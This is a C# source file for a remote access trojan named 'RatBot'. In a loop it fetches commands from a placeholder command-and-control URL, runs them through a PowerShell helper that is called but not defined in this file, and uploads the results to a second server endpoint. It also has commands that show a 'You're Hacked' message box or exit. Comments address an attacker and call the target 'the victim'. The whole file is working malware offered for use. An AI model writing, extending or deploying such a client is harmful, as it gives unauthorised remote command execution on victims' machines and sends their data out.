﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatBot
{
    internal class RAT
    {
        static WebClient webClient = new WebClient();
        static void Main(string[] args)
        {
            while (true)
            {
                System.Threading.Thread.Sleep(2000);

                //-- use 127.0.0.1 if your server is on the same machine as this client
                string cmdFromServer = webClient.DownloadString("http://your.ip.address/getServerCommands.php"); // Downloads Command from Server

                if (cmdFromServer.Contains("nofile")) continue; // Check to see if Commands Are in Queue to Execute or No
                if (cmdFromServer.Contains("Hacked"))
                {
					// will pop a Window in The Victim Computer That Says "Hacked"
					
                    MessageBox.Show("You're Hacked btw Lol");
                }
                else if (cmdFromServer.Contains("bye"))
                {
					//Will End The Process On The Victim Machine 
                   // MessageBox.Show("Goodbye, Process Ended"); //UnComment This if You Want The Victim to Know That The Process Ended
				   System.Environment.Exit(0); 
                }
                else // This Will Call The Class That Executes The Powershell Commands & Send The Results to The C2 Server 
                {
                    string retString = cmds.Run(cmdFromServer);
                    Console.WriteLine(retString);
                    webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    webClient.UploadString("http://your.ip.address/retString.php", "retstr=" + retString);
					// This is Possibliy Vulnarable to Injection Attacks (XSS & RCE Webshell) so Becarefull Who you Hack Lol
                }
                Console.WriteLine(cmdFromServer);

            }
        }

    }
}
